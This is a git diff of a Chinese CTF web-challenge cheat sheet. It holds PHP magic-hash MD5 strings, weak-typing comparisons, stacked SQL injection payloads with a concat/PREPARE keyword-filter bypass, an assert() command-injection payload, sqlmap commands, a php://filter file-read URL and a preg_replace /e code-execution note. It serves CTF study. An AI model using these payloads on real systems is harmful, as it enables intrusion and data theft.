@@ -8,7 +8,7 @@ tags: [Dev]
 description: "CTF /WEB"
 ---
 
-MD5 为 0exxxx开头的字符串
+MD5 为 0eXXXX开头的字符串
 ```
 QNKCDZO
 0e830400451993494058024219903391
@@ -44,17 +44,21 @@ s532378020a
 0e220463095855511507588041205815 
 ```
 
-POST
-file_get_contents('php://input','r');
+```sh
+# tools on git
+git clone https://github.com/lijiejie/GitHack
+git clone https://github.com/maurosoria/dirsearch
 
-```git
-- git clone https://github.com/lijiejie/GitHack
-- git clone https://github.com/maurosoria/dirsearch
-- python GitHack.py  http://url/.git/
+# commands
+python GitHack.py  http://url/.git/
 
 ```
 
-(==) "666" == 666.00e-0000
+PHP 弱类型
+```
+"666" == 666.00e-0000
+```
+
 
 PHP 序列化
 ```php
@@ -71,11 +75,14 @@ echo serialize($o);
 ```
 
 ```sql
-select 1,table_name from information_schema.tables where table_schema='csdb' and table_type='base table';
+select table_schema,table_name from information_schema.tables;
 
 concat('se', 'lect')
+
 1';show tables;
+
 1';show columns from `1919810931114514`;#
+
 1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
 ```
 
@@ -101,7 +108,7 @@ assert("file_exists('$file')") or die("That file doesn't exist!");
 assert("strpos(‘templates/1’, ‘2’) === false and system(‘cat templates/flag.php’) and strpos(‘templates/flag.php’) or die(“Detected hacking attempt!”);
 ```
 
-
+sqlmap 注入
 ```sh
 # 注入测试
     sqlmap -r <file> #file 是请求文件
@@ -137,7 +144,12 @@ PHP 读取任意文件base64编码
 http://url?arg0=php://filter/read=convert.base64-encode/resource=xxx.php
 ```
 
-PHP preg_replace 漏洞
+PHP 读取POST.body
+```
+file_get_contents('php://input','r');
+```
+
+PHP preg_replace() 漏洞
 ```php
 /**
  * $pattern 以 '/e' 结尾, 则 $replacement 会被当作php代码替换
